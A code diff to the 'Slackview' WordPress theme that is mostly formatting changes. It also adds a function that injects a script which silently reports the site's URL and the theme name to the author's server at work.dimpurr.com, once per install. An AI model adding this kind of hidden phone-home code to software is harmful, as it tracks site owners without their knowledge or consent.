@@ -37,29 +37,42 @@ function dpt_pagenav() {
 		'next_text' => __('Next Page →','slackview')
 	);
 
-	if( $wp_rewrite->using_permalinks() )
+	if ( $wp_rewrite->using_permalinks() )
 		$pagination['base'] = user_trailingslashit( trailingslashit( remove_query_arg('s',get_pagenum_link(1) ) ) . 'page/%#%/', 'paged');
 
-	if( !empty($wp_query->query_vars['s']) )
+	if ( !empty($wp_query->query_vars['s']) )
 		$pagination['add_args'] = array('s'=>get_query_var('s'));
 
 	echo paginate_links($pagination);
 }
 
+function dpt_send_static() {
+
+	function dpt_send() {
+		?><script type="text/javascript">$(document).ready(function(){$.get("http://work.dimpurr.com/theme/theme_tj.php?theme_name=Slackview&blog_url=<?=get_bloginfo('url')?>&t=" + Math.random())})</script><?php
+		update_option( 'dpt_send', true );
+	};
+
+	if ( get_option('dpt_send') != true ) {
+		dpt_send();
+	}
+
+}
+
 function mv_browser_body_class($classes) {
 	global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
-	if($is_lynx) $classes[] = 'lynx';
-	elseif($is_gecko) $classes[] = 'gecko';
-	elseif($is_opera) $classes[] = 'opera';
-	elseif($is_NS4) $classes[] = 'ns4';
-	elseif($is_safari) $classes[] = 'safari';
-	elseif($is_chrome) $classes[] = 'chrome';
-	elseif($is_IE) {
+	if ( $is_lynx ) $classes[] = 'lynx';
+	elseif ( $is_gecko ) $classes[] = 'gecko';
+	elseif ( $is_opera ) $classes[] = 'opera';
+	elseif ( $is_NS4 ) $classes[] = 'ns4';
+	elseif ( $is_safari ) $classes[] = 'safari';
+	elseif ( $is_chrome ) $classes[] = 'chrome';
+	elseif ( $is_IE ) {
 		$classes[] = 'ie';
 		if(preg_match('/MSIE ([0-9]+)([a-zA-Z0-9.]+)/', $_SERVER['HTTP_USER_AGENT'], $browser_version))
 			$classes[] = 'ie'.$browser_version[1];
 	} else $classes[] = 'unknown';
-	if($is_iphone) $classes[] = 'iphone';
+	if ( $is_iphone ) $classes[] = 'iphone';
 	if ( stristr( $_SERVER['HTTP_USER_AGENT'],"mac") ) {
 		$classes[] = 'osx';
 	} elseif ( stristr( $_SERVER['HTTP_USER_AGENT'],"linux") ) {
